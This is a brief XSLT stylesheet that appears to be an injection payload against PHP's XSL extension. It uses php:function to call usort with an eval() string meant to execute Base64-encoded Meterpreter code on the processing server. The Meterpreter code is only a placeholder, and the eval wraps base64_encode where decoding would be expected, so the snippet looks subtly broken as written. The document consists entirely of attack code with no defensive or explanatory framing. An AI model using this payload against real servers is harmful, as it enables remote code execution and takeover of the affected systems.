<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
         <xsl:template match="/">
                  
                 <xsl:variable name="eval">
                          eval(base64_encode('Base64-encoded Meterpreter code'))
                   </xsl:variable>
                  
                   <xsl:variable name="preg" select="php:function('usort', string(path/element/text()), $eval)"/>
                 
         </xsl:template>
  </xsl:stylesheet>
